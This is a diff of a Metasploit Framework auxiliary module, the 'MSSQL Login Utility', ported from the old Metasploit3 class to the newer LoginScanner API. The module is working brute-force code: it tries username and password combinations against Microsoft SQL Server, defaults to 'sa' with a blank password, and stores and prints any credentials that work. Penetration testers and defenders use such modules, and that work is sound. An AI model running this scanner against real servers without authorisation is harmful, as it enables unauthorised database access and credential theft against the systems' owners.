@@ -1,75 +1,90 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'metasploit/framework/credential_collection'
+require 'metasploit/framework/login_scanner/mssql'
 
-require 'msf/core'
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::MSSQL
+  include Msf::Auxiliary::Report
+  include Msf::Auxiliary::AuthBrute
 
+  include Msf::Auxiliary::Scanner
 
-class Metasploit3 < Msf::Auxiliary
+  def initialize
+    super(
+      'Name'           => 'MSSQL Login Utility',
+      'Description'    => 'This module simply queries the MSSQL instance for a specific user/pass (default is sa with blank).',
+      'Author'         => 'MC',
+      'References'     =>
+        [
+          [ 'CVE', '1999-0506'] # Weak password
+        ],
+      'License'        => MSF_LICENSE,
+      # some overrides from authbrute since there is a default username and a blank password
+      'DefaultOptions' =>
+        {
+          'USERNAME' => 'sa',
+          'BLANK_PASSWORDS' => true
+        }
+    )
 
-	include Msf::Exploit::Remote::MSSQL
-	include Msf::Auxiliary::Report
-	include Msf::Auxiliary::AuthBrute
+    deregister_options('PASSWORD_SPRAY')
+  end
 
-	include Msf::Auxiliary::Scanner
+  def run_host(ip)
+    print_status("#{rhost}:#{rport} - MSSQL - Starting authentication scanner.")
 
-	def initialize
-		super(
-			'Name'           => 'MSSQL Login Utility',
-			'Description'    => 'This module simply queries the MSSQL instance for a specific user/pass (default is sa with blank).',
-			'Author'         => 'MC',
-			'References'     =>
-				[
-					[ 'CVE', '1999-0506'] # Weak password
-				],
-			'License'        => MSF_LICENSE
-		)
-	end
+    if datastore['TDSENCRYPTION']
+      print_status("Manually enabled TLS/SSL to encrypt TDS payloads.")
+    end
 
-	def run_host(ip)
-		print_status("#{rhost}:#{rport} - MSSQL - Starting authentication scanner.")
-		each_user_pass { |user, pass|
-			do_login(user, pass, datastore['VERBOSE'])
-		}
-		# The service should already be reported at this point courtesy of
-		# report_auth_info, but this is currently the only way to give it a
-		# name.
-		report_service({
-			:host => rhost,
-			:port => rport,
-			:proto => 'tcp',
-			:name => 'mssql'
-		})
-	end
+    cred_collection = build_credential_collection(
+        realm: datastore['DOMAIN'],
+        username: datastore['USERNAME'],
+        password: datastore['PASSWORD']
+    )
 
-	def do_login(user='sa', pass='', verbose=false)
-		vprint_status("#{rhost}:#{rport} - MSSQL - Trying username:'#{user}' with password:'#{pass}'")
-		begin
-			success = mssql_login(user, pass)
+    scanner = Metasploit::Framework::LoginScanner::MSSQL.new(
+        host: ip,
+        port: rport,
+        proxies: datastore['PROXIES'],
+        cred_details: cred_collection,
+        stop_on_success: datastore['STOP_ON_SUCCESS'],
+        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
+        connection_timeout: 30,
+        max_send_size: datastore['TCP::max_send_size'],
+        send_delay: datastore['TCP::send_delay'],
+        windows_authentication: datastore['USE_WINDOWS_AUTHENT'],
+        tdsencryption: datastore['TDSENCRYPTION'],
+        framework: framework,
+        framework_module: self,
+        ssl: datastore['SSL'],
+        ssl_version: datastore['SSLVersion'],
+        ssl_verify_mode: datastore['SSLVerifyMode'],
+        ssl_cipher: datastore['SSLCipher'],
+        local_port: datastore['CPORT'],
+        local_host: datastore['CHOST']
+    )
 
-			if (success)
-				print_good("#{rhost}:#{rport} - MSSQL - successful login '#{user}' : '#{pass}'")
-				report_auth_info(
-					:host => rhost,
-					:port => rport,
-					:sname => 'mssql',
-					:user => user.downcase,
-					:pass => pass,
-					:source_type => "user_supplied",
-					:active => true
-				)
-				return :next_user
-			else
-				vprint_error("#{rhost}:#{rport} failed to login as '#{user}'")
-				return
-			end
-		rescue ::Rex::ConnectionError
-			vprint_error("#{rhost}:#{rport} connection failed")
-			return :abort
-		end
-	end
+    scanner.scan! do |result|
+      credential_data = result.to_h
+      credential_data.merge!(
+          module_fullname: self.fullname,
+          workspace_id: myworkspace_id
+      )
+      if result.success?
+        credential_core = create_credential(credential_data)
+        credential_data[:core] = credential_core
+        create_credential_login(credential_data)
+
+        print_good "#{ip}:#{rport} - Login Successful: #{result.credential}"
+      else
+        invalidate_login(credential_data)
+        vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
+      end
+    end
+  end
 end
